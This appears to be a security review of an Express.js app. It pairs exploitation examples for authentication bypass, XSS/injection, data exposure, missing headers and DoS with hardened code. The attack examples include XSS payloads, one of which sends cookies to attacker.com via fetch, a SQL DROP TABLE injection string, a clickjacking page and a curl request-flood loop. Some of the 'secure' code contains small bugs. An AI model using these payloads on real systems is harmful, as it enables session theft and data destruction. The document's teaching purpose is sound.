# Vulnerability Examples and Attack Scenarios

## Overview
This document provides concrete examples of how the vulnerabilities in the original `app.js` can be exploited, along with secure implementations.

---

## 1. CRITICAL: Authentication Bypass

### How It's Exploited
```bash
# No authentication required - anyone can access user data
curl http://localhost:3000/users

# Response includes all user information including emails
{
  "data": [
    { "id": 1, "name": "Alice", "email": "alice@example.com" },
    { "id": 2, "name": "Bob", "email": "bob@example.com" }
  ]
}

# This is Personally Identifiable Information (PII) accessible to anyone
```

### Attack Impact
- Unauthorized data access
- PII exposure
- Privacy violations (GDPR, CCPA)
- Account enumeration
- Targeted phishing attacks

### Secure Implementation
```javascript
// SECURE: Requires JWT token
app.get('/users', authenticateToken, (req, res) => {
  // User must provide valid token
  // Only authenticated users can access this endpoint

  if (req.user.role !== 'admin') {
    // Only admins can see all users
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json(users);
});

// Login endpoint to obtain token
app.post('/login', (req, res) => {
  const token = jwt.sign(
    { id: user.id, email: user.email, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );

  res.json({ token });
});

// Usage
// POST /login -> get token
// Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
// GET /users -> only works with valid token
```

---

## 2. HIGH: Injection Vulnerabilities

### XSS via Query Parameters
```bash
# Attacker crafts malicious URL
curl "http://localhost:3000/users?userId=<script>alert('XSS')</script>"

# Without validation, this could be:
# 1. Stored in logs (if logs are displayed in UI)
# 2. Reflected back to other users
# 3. Executed in browser context

# Example: If user profile is displayed without escaping
app.get('/user/:id', (req, res) => {
  // VULNERABLE: No validation
  const userId = req.params.id; // "<img src=x onerror=alert('XSS')>"

  res.send(`<html><body>User ID: ${userId}</body></html>`);
  // Renders unescaped HTML, executes JavaScript
});
```

### Attack Payload Examples
```
?userId=<img src=x onerror=alert('XSS')>
?search='; DROP TABLE users; --
?email="><script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
?name=<svg onload=fetch('http://attacker.com')>
```

### Secure Implementation
```javascript
const { query, validationResult } = require('express-validator');

app.get('/users', [
  // Input validation - whitelist approach
  query('userId')
    .optional()
    .isInt({ min: 1 })
    .toInt(),
  query('email')
    .optional()
    .isEmail()
    .normalizeEmail(),
  query('search')
    .optional()
    .trim()
    .escape() // Convert special HTML chars
    .isLength({ max: 100 })
], (req, res) => {
  // Validate all inputs
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }

  // Use parameterized queries for database
  // SELECT * FROM users WHERE id = ? AND email = ?

  // Escape output when returning HTML
  res.send(`<h1>${escapeHtml(req.query.search)}</h1>`);
});
```

---

## 3. HIGH: Sensitive Data Exposure

### PII Exposure
```bash
# Current implementation returns all user emails
curl http://localhost:3000/users

{
  "data": [
    { "id": 1, "name": "Alice", "email": "alice@example.com" },
    { "id": 2, "name": "Bob", "email": "bob@example.com" }
  ]
}

# Privacy issues:
# - Email addresses collected for targeted attacks
# - GDPR violation (unauthorized PII processing)
# - CCPA violation (California privacy law)
# - Can enable social engineering attacks
```

### Secure Implementation
```javascript
app.get('/users', authenticateToken, (req, res) => {
  const users = [
    { id: 1, name: 'Alice', email: 'alice@example.com', role: 'admin' },
    { id: 2, name: 'Bob', email: 'bob@example.com', role: 'user' }
  ];

  // Only return email to own profile or if admin
  if (req.user.role !== 'admin') {
    users = users.map(u => ({
      id: u.id,
      name: u.name,
      // Only include own email
      email: req.user.id === u.id ? u.email : undefined
    }));
  }

  res.json(users);
});
```

---

## 4. HIGH: Security Misconfiguration

### Missing Security Headers
```bash
# Current app doesn't set security headers
curl -i http://localhost:3000/health

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 42
# MISSING: Security headers!

# Vulnerabilities:
# - No X-Frame-Options -> Clickjacking attacks
# - No CSP -> XSS attacks
# - No X-Content-Type-Options -> MIME type sniffing
# - No HSTS -> SSL stripping attacks
```

### Attack: Clickjacking
```html
<!-- Attacker's page -->
<html>
<body>
  <iframe src="http://yourapp.com/users" style="opacity: 0;"></iframe>
  <button onclick="alert('You clicked me!')">Click to claim prize</button>
</body>
</html>
<!-- User clicks button thinking they're clicking something else
     But they're actually performing action on your app -->
```

### Secure Implementation with Helmet
```javascript
const helmet = require('helmet');

// Apply Helmet - sets multiple headers automatically
app.use(helmet());

// Response headers with helmet:
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 1; mode=block
// Strict-Transport-Security: max-age=31536000; includeSubDomains
// Content-Security-Policy: default-src 'self'

// Additional configuration
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

---

## 5. MEDIUM: Denial of Service (DoS)

### Brute Force Attack
```bash
# Without rate limiting, attacker can make unlimited requests
for i in {1..10000}; do
  curl "http://localhost:3000/users?attempt=$i" &
done

# Attacker can:
# - Enumerate all users (no limit)
# - Crash server (resource exhaustion)
# - Lock out accounts (if login attempts were tracked)
# - Extract information slowly
```

### Amplification Attack
```bash
# Large response DoS - attacker requests endpoint repeatedly
# Each request returns large response
curl "http://localhost:3000/users" > response.json

# If users list is large, repeated requests = bandwidth exhaustion
# Without limits on response size or request frequency
```

### Secure Implementation
```javascript
const rateLimit = require('express-rate-limit');

// Global rate limiter
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: 'Too many requests, please try again later',
});

// Stricter limiter for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // Only 5 login attempts per 15 minutes
  skipSuccessfulRequests: false,
});

// Apply limiters
app.use(globalLimiter);
app.post('/login', authLimiter, (req, res) => {
  // Now protected from brute force
});

// Payload size limits
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ limit: '10kb', extended: true }));

// Result: Each IP can only make 100 requests in 15 minutes
// Auth endpoints allow only 5 attempts
// Payloads must be under 10KB
```

